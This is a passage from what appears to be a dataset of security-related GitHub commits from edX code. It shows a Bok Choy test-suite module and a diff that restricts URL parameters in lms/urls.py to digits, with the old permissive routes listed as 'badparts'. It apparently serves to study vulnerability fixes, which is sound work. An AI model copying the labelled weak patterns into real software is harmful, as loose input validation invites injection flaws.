Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"}}, "msg": "Enable VERIFY_XSS checking by default."}}, "https://github.com/jlrivera81/incr-228": {"4e4c209ae3deb4c78bcec89c181516af8604b450": {"url": "https://api.github.com/repos/jlrivera81/incr-228/commits/4e4c209ae3deb4c78bcec89c181516af8604b450", "html_url": "https://github.com/jlrivera81/incr-228/commit/4e4c209ae3deb4c78bcec89c181516af8604b450", "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "add": 12, "remove": 12, "filename": "/lms/urls.py", "badparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.html_index'),"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.html_index', name=\"html_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 